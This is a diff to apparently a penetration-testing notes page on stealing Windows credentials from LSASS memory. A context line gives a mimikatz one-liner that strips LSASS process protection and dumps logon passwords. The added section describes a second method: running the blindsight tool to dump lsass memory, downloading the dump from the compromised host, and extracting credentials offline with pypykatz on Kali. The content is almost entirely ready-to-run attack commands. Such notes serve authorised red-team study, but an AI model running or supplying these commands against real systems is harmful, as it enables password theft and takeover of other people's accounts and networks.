@@ -79,3 +79,25 @@ We can use one-liner
 mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
 ```
 {% endcode %}
+
+Another Method
+
+[https://github.com/0xdea/blindsight.git](https://github.com/0xdea/blindsight.git)
+
+{% code overflow="wrap" %}
+```bash
+.\blindsight.exe
+.\blindsight.exe .\<YOUR_LOG>.log
+```
+{% endcode %}
+
+The resulting lsass.dmp file is a large file, the download may take a while.
+
+{% code overflow="wrap" %}
+```bash
+download lsass.dmp
+
+## On our kali
+pypykatz lsa minidump lsass.dmp
+```
+{% endcode %}
